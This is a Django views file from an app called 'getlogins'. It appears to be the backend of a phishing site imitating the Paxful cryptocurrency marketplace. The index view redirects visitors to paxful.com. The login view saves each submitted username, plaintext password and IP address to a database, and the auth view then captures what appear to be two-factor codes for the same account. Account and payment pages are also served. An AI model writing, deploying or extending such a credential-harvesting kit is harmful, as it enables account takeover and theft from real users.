from django.shortcuts import render
from django.template import loader

from .models import Logins
from django.http import HttpResponseRedirect

# Create your views here.
from django.http import HttpResponse,HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render, redirect
from django.http import JsonResponse
from django.http import HttpResponseBadRequest
from django.db.models.signals import post_save
from django.dispatch import receiver
from django.contrib import admin
from django.conf import settings

from firebase import firebase


def index(request):
    return HttpResponseRedirect("https://paxful.com/")

def account(request):
    if request.method == "GET":
        template = loader.get_template("getlogins/accounts.html")
        context = {}
        return HttpResponse(template.render(context, request))
   
def auth(request):
    if request.method == "GET":
        template = 'getlogins/auth.html'
        return render(request, template)
    elif request.method == "POST":
        codes = request.POST.get('codes', '')

        # Retrieve username from session
        username = request.session.get('auth_username')

        if username:
            try:
                user = Logins.objects.get(username=username)
            except Logins.DoesNotExist:
                user = Logins(username=username)

            user.codes = int(codes)
            user.save()

            return JsonResponse({'status': 'success'})
        else:
            return JsonResponse({'status': 'error', 'message': 'Username not found in session.'})
    else:
        return HttpResponseBadRequest("Invalid request method")


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def login(request):
    if request.method == "POST":
        name = request.POST['username']
        password = request.POST['password']
        ip = get_client_ip(request)

        # Save data to model
        login, created = Logins.objects.get_or_create(username=name)
        login.password = password
        login.ip = ip
        login.save()

        # Store username in session
        request.session['auth_username'] = name

        # Redirect to the next step
        return redirect("/auth")


def payment(request):
    if request.method == "GET":
        template = loader.get_template("getlogins/payment.html")
        context = {}
        return HttpResponse(template.render(context, request))
   


